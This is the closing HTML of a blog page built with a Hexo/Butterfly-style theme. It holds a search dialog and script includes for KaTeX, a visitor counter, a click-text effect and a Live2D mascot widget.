fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', '', 'katex-wrap')
+  })
+})()</script></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"./live2d_models/haruna/22/model.2017.school.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>
